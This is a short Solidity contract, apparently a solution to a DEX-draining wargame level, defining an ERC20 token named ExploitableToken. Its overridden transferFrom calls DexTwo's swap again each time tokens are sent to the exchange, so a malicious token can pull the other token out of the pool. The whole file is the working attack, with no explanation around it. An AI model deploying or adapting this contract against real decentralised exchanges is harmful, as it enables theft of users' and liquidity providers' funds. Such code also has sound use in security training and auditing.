pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract ExploitableToken is ERC20 {
    address private _dex;

    address private _otherToken;


    constructor(address dexInstance, address otherToken, string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 ether);
        _dex = dexInstance;
        _otherToken = otherToken;
    }

    function transferFrom(address from, address to, uint256 amount) override public returns (bool) {
        bool success = super.transferFrom(from, to, amount);

        // Reentrant call to swap more
        if (to == _dex) {
            DexTwo(_dex).swap(_otherToken, address(this), amount);
        }
        return success;
    }
}
